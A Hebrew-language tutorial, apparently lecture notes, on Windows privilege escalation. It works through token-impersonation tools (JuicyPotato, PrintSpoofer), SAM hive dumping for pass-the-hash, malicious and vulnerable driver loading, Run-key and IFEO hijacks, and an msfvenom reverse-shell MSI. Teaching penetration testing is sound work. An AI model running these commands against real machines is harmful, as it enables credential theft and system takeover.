
### **ניצול הרשאות מיוחדות ב-Windows**

####  ניצול הרשאת **SeImpersonatePrivilege – עם JuicyPotato, RoguePotato, PrintSpoofer**

הרשאת **SeImpersonatePrivilege** מאפשרת לנו לחטוף טוקנים של משתמשים עם הרשאות גבוהות יותר וליצור תהליך חדש עם הרשאות SYSTEM.

##### **בדיקה האם יש לנו את SeImpersonatePrivilege**

```powershell
whoami /priv | findstr "SeImpersonatePrivilege"
```

אם מופיע `Enabled`, ניתן לנצל זאת עם הכלים **JuicyPotato, RoguePotato, PrintSpoofer**.

#### **ניצול SeImpersonatePrivilege עם JuicyPotato**

הכלי JuicyPotato מנצל שירותי COM של Windows כדי ליצור תהליך חדש עם הרשאות SYSTEM. מתאים בעיקר ל-Windows Server 2016 ומטה.

```powershell
JuicyPotato.exe -p "C:\Windows\System32\cmd.exe" -t * -l 1337
```

זה יפעיל `cmd.exe` עם הרשאות SYSTEM.
#### **ניצול SeImpersonatePrivilege עם RoguePotato**

מערכת Windows Server 2019 חסם את המנגנון של JuicyPotato, אך RoguePotato עקף את החסימה באמצעות יצירת שרת COM מרוחק.

```powershell
RoguePotato.exe -r 192.168.1.100 -e "C:\Windows\System32\cmd.exe"
```

_יש צורך בגישה לרשת כדי להפעיל את השרת המרוחק._

#### **ניצול SeImpersonatePrivilege עם PrintSpoofer**

והכלי האולטימטיבי: PrintSpoofer מנצל חולשה בשירות Print Spooler ומאפשר הרצת קוד כ-SYSTEM גם ב-Windows 10 ו-Server 2019.

```powershell
PrintSpoofer.exe -i -c cmd.exe
```

אם ההרצה מצליחה, ייפתח חלון `cmd.exe` עם SYSTEM.

### ניצול הרשאת **SeBackupPrivilege ו-SeRestorePrivilege – גישה לקבצי מערכת**

אם יש לנו את ההרשאות הללו, ניתן לגשת לקבצי מערכת רגישים כמו `SAM`, המכיל האשים של סיסמאות.

#### **בדיקת הרשאות SeBackupPrivilege**

```powershell
whoami /priv | findstr "SeBackupPrivilege"
```

#### **שימוש ב-SeBackupPrivilege לשליפת ה-SAM**

```powershell
reg save hklm\sam C:\sam.save
reg save hklm\system C:\system.save
```

נוכל לפענח את ההאשים מתוך הקובץ `SAM` ולבצע **Pass-the-Hash** כדי להתחבר כ-Administrator.

### ניצול הרשאת **SeLoadDriverPrivilege – טעינת דרייבר זדוני (BYOVD)**

אם יש לנו הרשאת `SeLoadDriverPrivilege`, ניתן לטעון דרייבר פגיע או זדוני כדי לקבל הרשאות SYSTEM או אפילו גישה ל-Ring 0 בקרנל.

#### **בדיקה אם יש לנו SeLoadDriverPrivilege**

```powershell
whoami /priv | findstr "SeLoadDriverPrivilege"
```

#### **ניצול הרשאה לטעינת דרייבר זדוני**

```powershell
sc create evilservice binpath= "C:\malicious.sys" type= kernel
sc start evilservice
```

זה יפעיל קוד ברמת הקרנל.

#### **BYOVD – ניצול דרייברים פגיעים**

במתקפות **Bring Your Own Vulnerable Driver (BYOVD)**, תוקפים מתקינים דרייבר חתום על ידי מיקרוסופט, אך פגיע לחולשת 1day ומשתמשים בו להסלמת הרשאות.

##### **דוגמאות לדרייברים פגיעים שניתן לנצל:**

- **Capcom.sys** – מאפשר הרצת קוד בקרנל.
    
- **RTCore64.sys** (MSI Afterburner) – מעניק גישה ישירה לזיכרון.
    
- **dbutil_2_3.sys** (Dell) – נוצל להשגת SYSTEM.

##### **ניצול דרייבר פגיע להעלאת הרשאות**

אם יש לנו דרייבר פגיע, נוכל להעלות אותו, ופשוט להשתמש בו כדי להריץ קוד.
- כמובן שזה משתנה בין דרייבר ובין השמשה, חפשו באינטרנט לפי גרסת המחשב שלכם איזה driver ניתן להעלות
## חולשות בregistry

רישום המערכת (Registry) של Windows מכיל מידע קריטי כמו הגדרות מערכת, הרשאות, מיקומי קבצים ושירותים. אם יש לנו הרשאות כתיבה במפתחות מסוימים, נוכל לשנות ערכים ולהשיג הרשאות גבוהות יותר.

### **1. בדיקת הרשאות כתיבה ברישום**

נשתמש בפקודת **reg query** כדי לבדוק הרשאות גישה:

```powershell
reg query HKLM\Software
```

או להשתמש בכלי **AccessChk** מ-Sysinternals כדי לבדוק אם יש לנו הרשאות כתיבה:

```powershell
accesschk.exe -k HKLM\Software
```

אם נמצא מפתח עם הרשאות כתיבה, נוכל לנצל זאת לטובתנו.


### **2. ניצול הרשאות כתיבה ב-Run Keys (Persistence & PE)**

מפתחות `Run` משמשים להפעלת תוכנות באופן אוטומטי בעת אתחול המערכת. אם יש לנו גישה לערכים הללו, נוכל להוסיף קובץ זדוני שירוץ עם הרשאות גבוהות.

#### **בדיקת הרשאות על מפתחות Run**

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

#### **הוספת הרשומה הזדונית**

```powershell
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d "C:\malicious.exe" /f
```

לאחר הפעלה מחדש של המערכת, `malicious.exe` ירוץ עם הרשאות המפתח.

## ניצול חולשות IFEO

מפתחות IFEO מאפשרים להגדיר Debugger לכל קובץ הרצה. אם נוכל לשנות אותם, נוכל לגרום להפעלה של תוכנית זדונית במקום תהליכים חוקיים.

#### **בדיקה אם יש לנו גישה ל-IFEO**

```powershell
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
```

#### **שימוש ב-IFEO להרצת קובץ זדוני במקום cmd.exe**

```powershell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe" /v Debugger /t REG_SZ /d "C:\malicious.exe" /f
```

כעת, כל ניסיון לפתוח `cmd.exe` יריץ את `malicious.exe` שלנו.

## ניצול AlwaysInstallElevated להפעלת קובץ MSI עם SYSTEM**

אם שתי ההגדרות הללו קיימות וערכן `1`, ניתן להריץ קובץ MSI עם הרשאות SYSTEM:

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

#### **אם ההגדרות מופעלות, ננצל אותן כך:**

1. יוצרים קובץ MSI זדוני עם `msfvenom`:

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > exploit.msi
```

2. מריצים אותו עם הרשאות SYSTEM:

```powershell
msiexec /quiet /qn /i exploit.msi
```

בהרצאה הבאה אמשיך להציג עוד שיטות מעולות להסלמת הרשאות.
